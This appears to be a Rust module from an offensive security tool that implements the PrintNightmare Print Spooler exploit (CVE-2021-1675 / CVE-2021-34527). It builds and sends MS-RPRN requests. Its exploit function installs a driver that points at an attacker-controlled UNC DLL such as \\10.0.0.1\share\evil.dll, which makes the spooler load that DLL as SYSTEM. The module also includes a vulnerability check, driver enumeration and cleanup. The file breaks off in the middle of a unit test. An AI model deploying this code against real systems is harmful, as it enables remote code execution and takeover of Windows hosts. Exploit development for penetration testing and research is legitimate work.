//! MS-RPRN Print Spooler driver management -- CVE-2021-1675 / CVE-2021-34527
//! "PrintNightmare" remote code execution primitives.
//!
//! Wire reference: impacket `rprn.py` master + ly4k `printnightmare.py`
//! (byte layouts verified during protocol research):
//!
//! - `STRING_HANDLE` and `RPC_UNICODE_STRING*` fields are serialized as a
//!   unique pointer: ReferentID (non-zero u32) followed by a conformant WSTR
//!   (max_count / offset / actual_count + UTF-16LE data incl. terminator,
//!   padded to 4 bytes). See [`crate::proto::epm::ndr_conformant_string`].
//! - `RpcAddPrinterDriverEx` (opnum 89):
//!   `pName` (STRING_HANDLE), `pDriverContainer` (unique ->
//!   `DRIVER_CONTAINER`), `pConfigFile` (unique WSTR), `dwFileCopyFlags`.
//!   `DRIVER_CONTAINER` = cUnits + unique -> `DRIVER_INFO_2`
//!   = cVersion(3) + five unique WSTR pointers.
//!   Deferred object referents are emitted after all structs, so the five
//!   string blobs appear in field order: pName, pEnvironment, pDriverPath,
//!   pDataFile, pConfigFile.
//! - `RpcEnumPrinterDrivers` (opnum 10): round 1 with `pDrivers = NULL`
//!   (`referent id 0`) and `cbBuf = 0` returns `ERROR_INSUFFICIENT_BUFFER`
//!   (0x7A) together with `pcbNeeded`; round 2 re-issues the call with
//!   `cbBuf = pcbNeeded` and retrieves the DRIVER_INFO_2 array.
//! - `RpcDeletePrinterDriverEx` (opnum 84): `pName`, `pEnvironment`,
//!   `pDriverName`, `dwDeleteFlag`, `dwVersionNum`.
//! - `dwFileCopyFlags = 0x8014` (APD_COPY_FROM_DIRECTORY | APD_DONT_COPY_FILES
//!   | APD_INSTALL_WARNED_DRIVER), `pConfigFile` =
//!   `C:\Windows\System32\kernelbase.dll`, `pEnvironment` = `Windows x64`.
//! - Status classification (ly4k `check` semantics):
//!   `ERROR_INVALID_PARAMETER` (0x57) -> pre-patch behaviour ("vulnerable");
//!   `RPC_E_ACCESS_DENIED` (0x8001011B) / `STATUS_ACCESS_DENIED`
//!   (0xC0000022) / `ERROR_ACCESS_DENIED` (0x5) -> patched or blocked.

use crate::error::{OverthroneError, Result};
use crate::proto::coerce::CoerceCreds;
use crate::proto::epm::{
    build_rpc_bind, build_rpc_request, is_bind_accepted, ndr_conformant_string,
};
use crate::proto::smb::SmbSession;
use tracing::{debug, info, warn};

// ===========================================================
//  MS-RPRN Interface Constants
// ===========================================================

/// MS-RPRN UUID: 12345678-1234-abcd-ef00-0123456789ab
const RPRN_UUID: [u8; 16] = [
    0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89, 0xab,
];

/// MS-RPRN interface version 1.0
const RPRN_VERSION: (u16, u16) = (1, 0);

/// MS-RPRN named pipe
const RPRN_PIPE: &str = "spoolss";

/// RpcAddPrinterDriverEx (MS-RPRN 3.1.4.4.6, PrintNightmare install primitive)
const OP_RPC_ADD_PRINTER_DRIVER_EX: u16 = 89;

/// RpcEnumPrinterDrivers (MS-RPRN 3.1.4.4.8)
const OP_RPC_ENUM_PRINTER_DRIVERS: u16 = 10;

/// RpcDeletePrinterDriverEx (MS-RPRN 3.1.4.4.7 -- cleanup after the exploit)
const OP_RPC_DELETE_PRINTER_DRIVER_EX: u16 = 84;

/// `dwFileCopyFlags`: APD_COPY_FROM_DIRECTORY (0x8000) | APD_DONT_COPY_FILES
/// (0x4) | APD_INSTALL_WARNED_DRIVER (0x10). Same value the reference
/// PrintNightmare exploits use.
pub const APD_FLAGS_EXPLOIT: u32 = 0x8014;

/// Local world-readable config file every DLL uses as its config in the
/// reference exploits.
pub const DEFAULT_CONFIG_FILE: &str = "C:\\Windows\\System32\\kernelbase.dll";

/// Driver architecture passed as `pEnvironment` for 64-bit DCs.
pub const DEFAULT_ENVIRONMENT: &str = "Windows x64";

/// Server NTSTATUS / Win32 error returned when the server started parsing the
/// driver structure but rejected the arguments: seen on pre-August-2021
/// (vulnerable) spoolers in ly4k's check flow.
pub const ERROR_INVALID_PARAMETER: u32 = 0x57;

/// Server-published required buffer size for RpcEnumPrinterDrivers round 1.
pub const ERROR_INSUFFICIENT_BUFFER: u32 = 0x7A;

/// HRESULT returned when the spooler's hardened access check blocks driver
/// installation (patched behaviour).
pub const RPC_E_ACCESS_DENIED: u32 = 0x8001_011B;

/// NTSTATUS access denied (some builds return this instead of the HRESULT).
pub const STATUS_ACCESS_DENIED: u32 = 0xC000_0022;

/// Win32 error access denied.
pub const ERROR_ACCESS_DENIED: u32 = 0x5;

// ===========================================================
//  Result Types
// ===========================================================

/// Which PrintNightmare operation produced a result.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PrintNightmareMode {
    /// Vulnerability check via RpcAddPrinterDriverEx status classification.
    Check,
    /// Install a malicious driver via RpcAddPrinterDriverEx.
    Add,
    /// Uninstall a driver via RpcDeletePrinterDriverEx.
    Delete,
    /// Enumerate installed drivers via RpcEnumPrinterDrivers.
    List,
}

impl std::fmt::Display for PrintNightmareMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PrintNightmareMode::Check => write!(f, "check"),
            PrintNightmareMode::Add => write!(f, "add"),
            PrintNightmareMode::Delete => write!(f, "delete"),
            PrintNightmareMode::List => write!(f, "list"),
        }
    }
}

/// Result of one PrintNightmare operation.
#[derive(Debug, Clone)]
pub struct PrintNightmareResult {
    /// Target host (SMB peer) the spooler pipe was transacted against.
    pub target: String,
    /// Which mode produced this result.
    pub mode: PrintNightmareMode,
    /// True when the operation achieved what the mode intended.
    pub success: bool,
    /// Final RPC status/error code, when known.
    pub status_code: Option<u32>,
    /// Human-readable explanation (includes guidance on next steps).
    pub message: String,
}

/// One DRIVER_INFO_2 record returned by RpcEnumPrinterDrivers (level 2).
#[derive(Debug, Clone, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct PrintDriverInfo {
    /// Driver version/type level (3 = DRIVER_INFO_2).
    pub c_version: u32,
    /// Driver name (`pName`).
    pub name: Option<String>,
    /// Architecture (`pEnvironment`), e.g. `Windows x64`.
    pub environment: Option<String>,
    /// Driver DLL path (`pDriverPath`).
    pub driver_path: Option<String>,
    /// Data file path (`pDataFile`).
    pub data_file: Option<String>,
    /// Config file path (`pConfigFile`).
    pub config_file: Option<String>,
}

/// Probe result of RpcEnumPrinterDrivers round 1 (buffer sizing).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct EnumProbe {
    /// Required buffer size in bytes the server reported via `pcbNeeded`.
    pub pcb_needed: u32,
    /// Drivers that would have been returned via `cReturned`.
    pub c_returned: u32,
    /// Final RPC status (`ErrorCode`); expect `ERROR_INSUFFICIENT_BUFFER`.
    pub error_code: u32,
}

/// Classification result for a check-mode AddPrinterDriverEx status.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PrintNightmareVerdict {
    /// The server accepted and parsed the driver structure (0x57 / success).
    LikelyVulnerable,
    /// Hardened spooler rejects the operation (access denied family).
    PatchedOrBlocked,
    /// Unknown status -- report the raw code.
    Unknown,
}

/// Classify an RpcAddPrinterDriverEx NTSTATUS/Win32/HRESULT error code.
pub fn classify_add_status(status: Option<u32>) -> PrintNightmareVerdict {
    match status {
        None => PrintNightmareVerdict::Unknown,
        Some(0) | Some(ERROR_INVALID_PARAMETER) => PrintNightmareVerdict::LikelyVulnerable,
        Some(RPC_E_ACCESS_DENIED) | Some(STATUS_ACCESS_DENIED) | Some(ERROR_ACCESS_DENIED) => {
            PrintNightmareVerdict::PatchedOrBlocked
        }
        Some(_) => PrintNightmareVerdict::Unknown,
    }
}

// ===========================================================
//  NDR Builders (pure functions)
// ===========================================================

/// Unique pointer to a conformant WSTR (STRING_HANDLE / RPC_UNICODE_STRING*)
/// with an explicit referent id.
fn ndr_unique_wstr(refid: u32, s: &str) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(&refid.to_le_bytes());
    out.extend_from_slice(&ndr_conformant_string(s));
    out
}

/// Build the DRIVER_CONTAINER referent payload for RpcAddPrinterDriverEx
/// (level 2, cUnits = 1, cVersion = 3).
///
/// `refid` is mutated to allocate referent ids for the container, the
/// DRIVER_INFO_2 pointer and the five deferred string pointers, in NDR
/// defer-ordering.
fn build_driver_container(
    driver_name: &str,
    environment: &str,
    driver_path: &str,
    data_file: &str,
    config_file: &str,
    refid: &mut u32,
) -> Vec<u8> {
    let container_refid = *refid;
    *refid += 1;
    let driver_info_refid = *refid;
    *refid += 1;
    let mut string_refids = [0u32; 5];
    for r in string_refids.iter_mut() {
        *r = *refid;
        *refid += 1;
    }

    let mut out = Vec::new();
    // pDriverContainer referent: DRIVER_CONTAINER
    out.extend_from_slice(&container_refid.to_le_bytes());
    out.extend_from_slice(&1u32.to_le_bytes()); // cUnits = 1
    // pDrivers referent: DRIVER_INFO_2 (cVersion + 5 unique string pointers)
    out.extend_from_slice(&driver_info_refid.to_le_bytes());
    out.extend_from_slice(&3u32.to_le_bytes()); // cVersion = 3
    for rid in string_refids {
        out.extend_from_slice(&rid.to_le_bytes());
    }
    // Deferred referents, in pointer-emission order.
    out.extend_from_slice(&ndr_conformant_string(driver_name));
    out.extend_from_slice(&ndr_conformant_string(environment));
    out.extend_from_slice(&ndr_conformant_string(driver_path));
    out.extend_from_slice(&ndr_conformant_string(data_file));
    out.extend_from_slice(&ndr_conformant_string(config_file));
    out
}

/// Build the RpcAddPrinterDriverEx stub (opnum 89).
///
/// Pass `config_file: None` for the check-mode call (the parameter is
/// serialized as a NULL unique pointer).
pub fn build_add_printer_driver_ex_stub(
    server_unc: &str,
    driver_name: &str,
    environment: &str,
    driver_path: &str,
    data_file: &str,
    config_file: Option<&str>,
    flags: u32,
) -> Vec<u8> {
    let mut out = Vec::new();
    let mut refid = 1u32; // pName gets referent id 1
    out.extend_from_slice(&ndr_unique_wstr(refid, server_unc));
    refid += 1;

    out.extend_from_slice(&build_driver_container(
        driver_name,
        environment,
        driver_path,
        data_file,
        config_file.unwrap_or(""),
        &mut refid,
    ));

    match config_file {
        Some(cf) => out.extend_from_slice(&ndr_unique_wstr(refid, cf)),
        None => out.extend_from_slice(&0u32.to_le_bytes()), // NULL unique pointer
    }
    out.extend_from_slice(&flags.to_le_bytes());
    out
}

/// Build the RpcAddPrinterDriverEx stub used by ly4k's check mode: a level-2
/// container with empty paths so a vulnerable spooler answers
/// `ERROR_INVALID_PARAMETER` (it parsed the structure) while a hardened
/// spooler answers with the access-denied family.
pub fn build_check_stub(server_unc: &str) -> Vec<u8> {
    build_add_printer_driver_ex_stub(
        server_unc,
        "Microsoft Print to PDF",
        DEFAULT_ENVIRONMENT,
        "",
        "",
        Some(""),
        0,
    )
}

/// Build the RpcEnumPrinterDrivers stub (opnum 10) round 1:
/// `pDrivers = NULL`, `cbBuf = 0` (learn the required buffer size).
pub fn build_enum_printer_drivers_stub_round1(server_unc: &str, environment: &str) -> Vec<u8> {
    build_enum_printer_drivers_stub(server_unc, environment, 2, Some(0), 0)
}

/// Build the RpcEnumPrinterDrivers stub round 2 with the buffer learned in
/// round 1 (`pDrivers` unique pointer to a `cbBuf`-sized byte array).
pub fn build_enum_printer_drivers_stub_round2(
    server_unc: &str,
    environment: &str,
    cb_buf: u32,
) -> Vec<u8> {
    build_enum_printer_drivers_stub(server_unc, environment, 2, Some(1), cb_buf)
}

/// Core RpcEnumPrinterDrivers stub builder. `p_drivers_refid` is `Some(0)`
/// for a NULL pointer or `Some(n)` for a non-null referent.
fn build_enum_printer_drivers_stub(
    server_unc: &str,
    environment: &str,
    level: u32,
    p_drivers_refid: Option<u32>,
    cb_buf: u32,
) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(&ndr_unique_wstr(1, server_unc));
    out.extend_from_slice(&ndr_unique_wstr(2, environment));
    out.extend_from_slice(&level.to_le_bytes());
    match p_drivers_refid {
        Some(rid) => out.extend_from_slice(&rid.to_le_bytes()),
        None => out.extend_from_slice(&0u32.to_le_bytes()),
    }
    if p_drivers_refid.is_some() && p_drivers_refid != Some(0) {
        // byte array: max_count + elements (don't-care zero payload)
        out.extend_from_slice(&cb_buf.to_le_bytes());
        out.extend(std::iter::repeat_n(0u8, cb_buf as usize));
    }
    out.extend_from_slice(&cb_buf.to_le_bytes());
    out
}

/// Build the RpcDeletePrinterDriverEx stub (opnum 84).
pub fn build_delete_printer_driver_ex_stub(
    server_unc: &str,
    environment: &str,
    driver_name: &str,
    delete_flag: u32,
    version_num: u32,
) -> Vec<u8> {
    let mut out = Vec::new();
    out.extend_from_slice(&ndr_unique_wstr(1, server_unc));
    out.extend_from_slice(&ndr_unique_wstr(2, environment));
    out.extend_from_slice(&ndr_unique_wstr(3, driver_name));
    out.extend_from_slice(&delete_flag.to_le_bytes());
    out.extend_from_slice(&version_num.to_le_bytes());
    out
}

// ===========================================================
//  NDR Parsers (pure functions)
// ===========================================================

/// Read one null-terminated UTF-16LE string at `off`, advancing the cursor
/// past the terminator and 4-byte padding. Returns `None` when out of bounds
/// or when no terminator is present within `buf`.
fn read_utf16_at(buf: &[u8], off: &mut usize) -> Option<String> {
    let start = *off;
    if start >= buf.len() {
        return None;
    }
    let mut units = Vec::new();
    let mut cur = start;
    let mut terminated = false;
    while cur + 2 <= buf.len() {
        let unit = u16::from_le_bytes([buf[cur], buf[cur + 1]]);
        cur += 2;
        if unit == 0 {
            terminated = true;
            break;
        }
        units.push(unit);
        if units.len() > 2048 {
            // Guard against unterminated garbage.
            return None;
        }
    }
    if !terminated {
        return None;
    }
    // advance, then pad to 4
    while cur < buf.len() && !(cur - start).is_multiple_of(4) {
        cur += 1;
    }
    *off = cur;
    Some(String::from_utf16_lossy(&units))
}

/// Read one unique-pointer referent to a conformant WSTR: cursor sits on the
/// referent start (max_count / offset / actual_count counts, then UTF-16LE
/// chars incl. terminator, padded to 4 relative to the referent start).
fn read_referent_wstr(buf: &[u8], cursor: &mut usize) -> Option<String> {
    let start = *cursor;
    if buf.len() <= start + 12 {
        *cursor = buf.len();
        return None;
    }
    let mut inner = start + 12;
    let s = read_utf16_at(buf, &mut inner)?;
    *cursor = inner;
    Some(s)
}

/// Parse the DRIVER_INFO_2 array from an RpcEnumPrinterDrivers level-2
/// response payload (the `pDrivers` referent bytes, after the referent id and
/// max_count in the response stub).
///
/// Layout: max_count / offset / actual_count, then `actual_count` 24-byte
/// structs (cVersion + five referent ids), then the deferred string blobs in
/// field order (pName, pEnvironment, pDriverPath, pDataFile, pConfigFile)
/// per element.
pub fn parse_drivers_payload(buf: &[u8]) -> Vec<PrintDriverInfo> {
    let mut drivers = Vec::new();
    if buf.len() < 12 {
        return drivers;
    }
    let actual = u32::from_le_bytes([buf[8], buf[9], buf[10], buf[11]]) as usize;
    let struct_area = 12 + actual.saturating_mul(24);
    if struct_area > buf.len() {
        return drivers;
    }
    let mut records = Vec::new();
    for i in 0..actual {
        let base = 12 + i * 24;
        let c_version =
            u32::from_le_bytes([buf[base], buf[base + 1], buf[base + 2], buf[base + 3]]);
        records.push(PrintDriverInfo {
            c_version,
            ..Default::default()
        });
    }
    // Deferred strings: five per record, in field order.
    let mut cursor = struct_area;
    for rec in &mut records {
        let fields: [&mut Option<String>; 5] = [
            &mut rec.name,
            &mut rec.environment,
            &mut rec.driver_path,
            &mut rec.data_file,
            &mut rec.config_file,
        ];
        for field in fields {
            if cursor >= buf.len() {
                break;
            }
            *field = read_referent_wstr(buf, &mut cursor);
        }
    }
    drivers.extend(records);
    drivers
}

/// Parse the RpcEnumPrinterDrivers round-1 response stub.
///
/// Stub starts at PDU offset 24: NULL pDrivers referent (0), then `pcbNeeded`,
/// `cReturned`, `ErrorCode` (12 bytes). Returns `None` for fault PDUs or
/// truncated buffers.
pub fn parse_enum_round1(resp: &[u8]) -> Option<EnumProbe> {
    if resp.len() < 3 || resp[2] == 3 {
        return None;
    }
    let stub = resp.get(24..)?;
    if stub.len() < 16 {
        return None;
    }
    // pDrivers referent must be NULL for round 1; next three u32s follow.
    let probe = EnumProbe {
        pcb_needed: u32::from_le_bytes([stub[4], stub[5], stub[6], stub[7]]),
        c_returned: u32::from_le_bytes([stub[8], stub[9], stub[10], stub[11]]),
        error_code: u32::from_le_bytes([stub[12], stub[13], stub[14], stub[15]]),
    };
    Some(probe)
}

/// Parse the RpcEnumPrinterDrivers round-2 response stub.
///
/// Stub starts at PDU offset 24: non-null pDrivers referent + max_count +
/// `max_count` bytes or DRIVER_INFO_2 array, then `pcbNeeded`, `cReturned`,
/// `ErrorCode`.
pub fn parse_enum_round2(resp: &[u8]) -> Option<(Vec<PrintDriverInfo>, EnumProbe)> {
    if resp.len() < 3 || resp[2] == 3 {
        return None;
    }
    let stub = resp.get(24..)?;
    if stub.len() < 24 {
        return None;
    }
    let refid = u32::from_le_bytes([stub[0], stub[1], stub[2], stub[3]]);
    let max_count = u32::from_le_bytes([stub[4], stub[5], stub[6], stub[7]]) as usize;
    if refid == 0 || max_count == 0 {
        return None;
    }
    let data_end = (8 + max_count).min(stub.len().saturating_sub(12));
    let payload = &stub[8..data_end];
    let drivers = parse_drivers_payload(payload);
    let tail = data_end;
    if stub.len() < tail + 12 {
        return None;
    }
    let probe = EnumProbe {
        pcb_needed: u32::from_le_bytes([
            stub[tail],
            stub[tail + 1],
            stub[tail + 2],
            stub[tail + 3],
        ]),
        c_returned: u32::from_le_bytes([
            stub[tail + 4],
            stub[tail + 5],
            stub[tail + 6],
            stub[tail + 7],
        ]),
        error_code: u32::from_le_bytes([
            stub[tail + 8],
            stub[tail + 9],
            stub[tail + 10],
            stub[tail + 11],
        ]),
    };
    Some((drivers, probe))
}

/// Extract the RPC fault status from a fault PDU, if it is one.
pub fn is_rpc_fault(resp: &[u8]) -> Option<u32> {
    if resp.len() >= 28 && resp[2] == 3 {
        Some(u32::from_le_bytes([resp[24], resp[25], resp[26], resp[27]]))
    } else {
        None
    }
}

/// Extract the trailing status out-param from a REQUEST response stub
/// (last u32 of the stub for the driver-management ops, which all end in
/// `DWORD ErrorCode`).
pub fn tail_status(resp: &[u8]) -> Option<u32> {
    if resp.len() < 28 {
        return None;
    }
    Some(u32::from_le_bytes([
        resp[resp.len() - 4],
        resp[resp.len() - 3],
        resp[resp.len() - 2],
        resp[resp.len() - 1],
    ]))
}

// ===========================================================
//  Async Operations (SMB named-pipe transport)
// ===========================================================

/// Bind to the spoolss pipe and return the session handle-less context.
async fn bind_rprn(smb: &SmbSession) -> Result<()> {
    let bind_pdu = build_rpc_bind(&RPRN_UUID, RPRN_VERSION.0, RPRN_VERSION.1);
    let resp = smb
        .pipe_transact(RPRN_PIPE, &bind_pdu)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("MS-RPRN bind failed: {e}"),
        })?;
    if !is_bind_accepted(&resp) {
        return Err(OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: "MS-RPRN bind rejected (Print Spooler may be disabled -- \
                     the service is OFF by default on stock Windows Server 2025)"
                .to_string(),
        });
    }
    Ok(())
}

/// Open an SMB session (authenticated when creds are given, null session
/// otherwise) and bind the spoolss pipe.
async fn connect_and_bind(target: &str, creds: Option<&CoerceCreds>) -> Result<SmbSession> {
    let smb = match creds {
        Some(c) => SmbSession::connect(target, &c.domain, &c.username, &c.password)
            .await
            .map_err(|e| {
                OverthroneError::Smb(format!(
                    "PrintNightmare: authenticated SMB session failed: {e}"
                ))
            })?,
        None => SmbSession::connect(target, "", "", "").await.map_err(|e| {
            OverthroneError::Smb(format!("PrintNightmare: null SMB session failed: {e}"))
        })?,
    };
    bind_rprn(&smb).await?;
    Ok(smb)
}

fn server_unc(target: &str) -> String {
    format!("\\\\{}", target.trim_start_matches('\\'))
}

/// RpcAddPrinterDriverEx against the target spooler. Returns the raw
/// trailing status so callers can classify.
async fn rpc_add_printer_driver(
    smb: &SmbSession,
    server_unc: &str,
    driver_name: &str,
    driver_path: &str,
    data_file: &str,
    config_file: Option<&str>,
    flags: u32,
) -> Result<u32> {
    let stub = build_add_printer_driver_ex_stub(
        server_unc,
        driver_name,
        DEFAULT_ENVIRONMENT,
        driver_path,
        data_file,
        config_file,
        flags,
    );
    let pdu = build_rpc_request(OP_RPC_ADD_PRINTER_DRIVER_EX, &stub);
    let resp = smb
        .pipe_transact(RPRN_PIPE, &pdu)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("RpcAddPrinterDriverEx failed: {e}"),
        })?;
    if let Some(status) = is_rpc_fault(&resp) {
        return Ok(status);
    }
    Ok(tail_status(&resp).unwrap_or(0xC000_0001))
}

/// PrintNightmare vulnerability check (ly4k check-mode semantics).
///
/// Sends an invalid `RpcAddPrinterDriverEx` and classifies the response:
/// `ERROR_INVALID_PARAMETER` (0x57) means the spooler parsed the structure
/// (pre-patch behaviour), access-denied family means patched/blocked.
pub async fn printnightmare_check(
    target: &str,
    creds: Option<&CoerceCreds>,
) -> Result<PrintNightmareResult> {
    info!("[PrintNightmare] check against {target}");
    let smb = match connect_and_bind(target, creds).await {
        Ok(s) => s,
        Err(e) => {
            return Ok(PrintNightmareResult {
                target: target.to_string(),
                mode: PrintNightmareMode::Check,
                success: false,
                status_code: None,
                message: format!(
                    "Spooler inaccessible: {e} (Print Spooler is disabled by \
                     default on Windows Server 2025 stock builds)"
                ),
            });
        }
    };
    let stub = build_check_stub(&server_unc(target));
    let pdu = build_rpc_request(OP_RPC_ADD_PRINTER_DRIVER_EX, &stub);
    let resp = smb
        .pipe_transact(RPRN_PIPE, &pdu)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("RpcAddPrinterDriverEx (check) failed: {e}"),
        })?;

    let status = is_rpc_fault(&resp).or_else(|| tail_status(&resp));
    let verdict = classify_add_status(status);
    let status_hex = format!("{:08x}", status.unwrap_or(0));
    let (success, message) = match verdict {
        PrintNightmareVerdict::LikelyVulnerable => (
            true,
            format!(
                "Target looks VULNERABLE to PrintNightmare (status \
                     0x{status_hex} = structure parsed). Continue with \
                     exploit mode."
            ),
        ),
        PrintNightmareVerdict::PatchedOrBlocked => (
            false,
            format!(
                "Spooler rejected driver installation (status 0x{status_hex}) \
                 -- patched or PrintNightmare hardening enabled."
            ),
        ),
        PrintNightmareVerdict::Unknown => (
            false,
            format!(
                "Inconclusive spooler response (status 0x{status_hex}) -- \
                 manual verification recommended."
            ),
        ),
    };
    info!("[PrintNightmare] check {target}: {message}");
    Ok(PrintNightmareResult {
        target: target.to_string(),
        mode: PrintNightmareMode::Check,
        success,
        status_code: status,
        message,
    })
}

/// Full PrintNightmare exploit: install a driver pointing at `dll_path`
/// (a UNC path to attacker-controlled DLL content, e.g.
/// `\\10.0.0.1\share\evil.dll`) so the spooler loads it as SYSTEM.
///
/// Also emits the cleanup command (`delete` mode) for the operator.
pub async fn printnightmare_exploit(
    target: &str,
    dll_path: &str,
    driver_name: &str,
    creds: Option<&CoerceCreds>,
) -> Result<PrintNightmareResult> {
    info!(
        "[PrintNightmare] exploit against {target} with driver '{driver_name}' loading {dll_path}"
    );
    let smb = match connect_and_bind(target, creds).await {
        Ok(s) => s,
        Err(e) => {
            return Ok(PrintNightmareResult {
                target: target.to_string(),
                mode: PrintNightmareMode::Add,
                success: false,
                status_code: None,
                message: format!(
                    "Spooler inaccessible: {e} (Print Spooler is disabled by \
                     default on Windows Server 2025 stock builds)"
                ),
            });
        }
    };
    let status = rpc_add_printer_driver(
        &smb,
        &server_unc(target),
        driver_name,
        dll_path,
        dll_path,
        Some(DEFAULT_CONFIG_FILE),
        APD_FLAGS_EXPLOIT,
    )
    .await?;

    let success = status == 0 || status == ERROR_INVALID_PARAMETER;
    let message = if success {
        format!(
            "Driver installation accepted (status 0x{status:08X}). The spooler \
             loads '{dll_path}' as SYSTEM. Follow up: delete the driver with \
             ovt printnightmare delete and clean up the UNC share. NOTE: the \
             exploit needs an authenticated session with local printer access."
        )
    } else if status == RPC_E_ACCESS_DENIED
        || status == STATUS_ACCESS_DENIED
        || status == ERROR_ACCESS_DENIED
    {
        format!(
            "Driver installation rejected (status 0x{status:08X}) -- the \
             target is patched (August 2021+) or Point-And-Print / \
             RestrictDriverInstallationToAdministrators blocks it."
        )
    } else {
        format!(
            "Driver installation returned unexpected status 0x{status:08X} -- \
             check share contents and path format."
        )
    };
    debug!("[PrintNightmare] exploit result: 0x{status:08X}");
    Ok(PrintNightmareResult {
        target: target.to_string(),
        mode: PrintNightmareMode::Add,
        success,
        status_code: Some(status),
        message,
    })
}

/// Remove a previously-installed malicious driver
/// (RpcDeletePrinterDriverEx opnum 84, `APD_DELETE_ALL_FILES`-style flags 0).
pub async fn printnightmare_delete(
    target: &str,
    driver_name: &str,
    creds: Option<&CoerceCreds>,
) -> Result<PrintNightmareResult> {
    info!("[PrintNightmare] delete driver '{driver_name}' on {target}");
    let smb = connect_and_bind(target, creds).await?;
    let stub = build_delete_printer_driver_ex_stub(
        &server_unc(target),
        DEFAULT_ENVIRONMENT,
        driver_name,
        0,
        3,
    );
    let pdu = build_rpc_request(OP_RPC_DELETE_PRINTER_DRIVER_EX, &stub);
    let resp = smb
        .pipe_transact(RPRN_PIPE, &pdu)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("RpcDeletePrinterDriverEx failed: {e}"),
        })?;
    let status = is_rpc_fault(&resp)
        .or_else(|| tail_status(&resp))
        .unwrap_or(0);
    let success = status == 0;
    let message = if success {
        format!("Driver '{driver_name}' deleted (status 0).")
    } else {
        format!(
            "Driver deletion returned status 0x{status:08X} (0x2 = not \
             installed / wrong architecture string)."
        )
    };
    Ok(PrintNightmareResult {
        target: target.to_string(),
        mode: PrintNightmareMode::Delete,
        success,
        status_code: Some(status),
        message,
    })
}

/// Enumerate a driver's DRIVER_INFO_2 details via RpcEnumPrinterDrivers
/// (round 1 buffer sizing + round 2 parse). Best-effort: returns the drivers
/// decoded when round-2 layout matches the expectation.
pub async fn printnightmare_list(
    target: &str,
    creds: Option<&CoerceCreds>,
) -> Result<Vec<PrintDriverInfo>> {
    info!("[PrintNightmare] listing drivers on {target}");
    let smb = connect_and_bind(target, creds).await?;
    let unc = server_unc(target);

    let stub = build_enum_printer_drivers_stub_round1(&unc, DEFAULT_ENVIRONMENT);
    let pdu = build_rpc_request(OP_RPC_ENUM_PRINTER_DRIVERS, &stub);
    let resp = smb
        .pipe_transact(RPRN_PIPE, &pdu)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("RpcEnumPrinterDrivers round 1 failed: {e}"),
        })?;
    if let Some(status) = is_rpc_fault(&resp) {
        debug!("[PrintNightmare] enum round 1 fault 0x{status:08X}");
        return Ok(Vec::new());
    }
    let Some(probe) = parse_enum_round1(&resp) else {
        debug!("[PrintNightmare] enum round 1 unparseable");
        return Ok(Vec::new());
    };
    if probe.error_code != ERROR_INSUFFICIENT_BUFFER || probe.pcb_needed == 0 {
        debug!(
            "[PrintNightmare] enum round 1: error=0x{:08X} pcb={}",
            probe.error_code, probe.pcb_needed
        );
        return Ok(Vec::new());
    }

    let stub = build_enum_printer_drivers_stub_round2(&unc, DEFAULT_ENVIRONMENT, probe.pcb_needed);
    let pdu = build_rpc_request(OP_RPC_ENUM_PRINTER_DRIVERS, &stub);
    let resp = smb
        .pipe_transact(RPRN_PIPE, &pdu)
        .await
        .map_err(|e| OverthroneError::Rpc {
            target: smb.target.clone(),
            reason: format!("RpcEnumPrinterDrivers round 2 failed: {e}"),
        })?;
    if let Some(status) = is_rpc_fault(&resp) {
        debug!("[PrintNightmare] enum round 2 fault 0x{status:08X}");
        return Ok(Vec::new());
    }
    let Some((drivers, probe2)) = parse_enum_round2(&resp) else {
        warn!("[PrintNightmare] enum round 2 buffer unparseable");
        return Ok(Vec::new());
    };
    debug!(
        "[PrintNightmare] enum round 2: {} drivers, error=0x{:08X}",
        drivers.len(),
        probe2.error_code
    );
    Ok(drivers)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_opnum_constants() {
        assert_eq!(OP_RPC_ADD_PRINTER_DRIVER_EX, 89);
        assert_eq!(OP_RPC_ENUM_PRINTER_DRIVERS, 10);
        assert_eq!(OP_RPC_DELETE_PRINTER_DRIVER_EX, 84);
    }

    #[test]
    fn test_uuid_constant() {
        assert_eq!(
            RPRN_UUID,
            [
                0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xcd, 0xab, 0xef, 0x00, 0x01, 0x23, 0x45, 0x67,
                0x89, 0xab
            ]
        );
        assert_eq!(RPRN_PIPE, "spoolss");
        assert_eq!(RPRN_VERSION, (1, 0));
    }

    #[test]
    fn test_flags_and_defaults() {
        assert_eq!(APD_FLAGS_EXPLOIT, 0x8014);
        assert_eq!(DEFAULT_CONFIG_FILE, "C:\\Windows\\System32\\kernelbase.dll");
        assert_eq!(DEFAULT_ENVIRONMENT, "Windows x64");
        assert_eq!(ERROR_INVALID_PARAMETER, 0x57);
        assert_eq!(ERROR_INSUFFICIENT_BUFFER, 0x7A);
        assert_eq!(RPC_E_ACCESS_DENIED, 0x8001011B);
        assert_eq!(STATUS_ACCESS_DENIED, 0xC0000022);
        assert_eq!(ERROR_ACCESS_DENIED, 0x5);
    }

    #[test]
    fn test_mode_display() {
        assert_eq!(PrintNightmareMode::Check.to_string(), "check");
        assert_eq!(PrintNightmareMode::Add.to_string(), "add");
        assert_eq!(PrintNightmareMode::Delete.to_string(), "delete");
        assert_eq!(PrintNightmareMode::List.to_string(), "list");
    }

    #[test]
    fn test_add_stub_layout() {
        let stub = build_add_printer_driver_ex_stub(
            "\\\\dc1",
            "pwned.dll",
            "Windows x64",
            "\\\\10.0.0.1\\share\\pwned.dll",
